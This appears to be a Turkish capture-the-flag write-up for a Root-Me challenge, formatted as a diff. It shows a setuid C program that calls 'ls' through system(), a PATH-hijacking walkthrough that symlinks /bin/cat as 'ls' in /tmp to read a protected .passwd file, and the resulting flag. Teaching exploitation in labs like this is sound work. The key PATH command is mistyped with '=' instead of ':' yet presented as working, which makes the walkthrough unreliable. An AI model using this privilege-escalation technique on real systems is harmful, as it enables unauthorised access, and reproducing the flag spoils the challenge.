@@ -1,0 +1,63 @@
+Find your path, padawan!
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+ 
+int main(void)
+{
+    setreuid(geteuid(), geteuid());
+    system("ls /challenge/app-script/ch11/.passwd");
+    return 0;
+}
+
+Challenge connection informations :
+
+Host	challenge02.root-me.org
+Protocol	SSH
+Port	2222
+SSH access	ssh -p 2222 app-script-ch11@challenge02.root-me.org     WebSSH
+Username	app-script-ch11
+Password	app-script-ch11
+
+Öncelikle terminal ekranından bize verilen bilgiler ile giriş yapıyoruz.
+root@kali:~# ssh -p 2222 app-script-ch11@challenge02.root-me.org
+The authenticity of host '[challenge02.root-me.org]:2222 ([212.129.38.224]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:lLVLmx31ZayZjhfkimWhsFnvYcJe2MzRSS893KUEkyY.
+Are you sure you want to continue connecting (yes/no)?
+yes diyerek devam ediyoruz.
+app-script-ch11@challenge02.root-me.org's password:
+Buraya bize verilmiş olan şifreyi giriyoruz : app-script-ch11
+Girişimizi yaptık.
+ls komutu ile içerisindeki bütün dosyaları görüntülüyoruz. Üzeri kırmızı ile çizilmiş ch11 dosyası ve ch11.c dosyası var
+ch11.c dosyasının içeriğini görüntülüyoruz.
+app-script-ch11@challenge02:~$ ls
+ch11  ch11.c Makefile
+app-script-ch11@challenge02:~$ cat ch11.c
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+ 
+int main(void)
+{
+    setreuid(geteuid(), geteuid());
+    system("ls /challenge/app-script/ch11/.passwd");
+    return 0;
+}
+
+Bu ch11'in kodu. Ls /challenge/app-script/ch11/.passwd dosyasını çalıştıracak
+
+Bayrak /challenge/app-script/ch11/.passwd adresinde bulunuyor, ancak erişimimiz yok. Dönüştürmeye çalışacağız ki, başka bir komut haline gelsin, bu basitçe cat ile olabilir.
+Burada dosya /bin/cat ile ilişkilendirilmiş ls adında sembolik bir bağlantı oluşturuyoruz.
+app-script-ch11@challenge02:/$ ls -l
+Bir tmp dosyası olduğunu görüyoruz.
+app-script-ch11@challenge02:/$ mkdir /tmp/delta 
+Klasör oluşturuyoruz.
+app-script-ch11@challenge02:/$ cd /tmp/delta
+app-script-ch11@challenge02:/tmp/delta$ ln -s /bin/cat ls
+Bu komut ile sembolik link oluşturuyoruz.
+app-script-ch11@challenge02:/tmp/delta$ PATH=/tmp/delta=$PATH
+app-script-ch11@challenge02:/tmp/delta$ echo $PATH
+daha sonra buralardan cd ~ ile çıkıyoruz 
+app-script-ch11@challenge02:~$ ./ch11 ile çalıştırıyoruz ve işte şifre.  
+!oPe96a/.s8d5
+
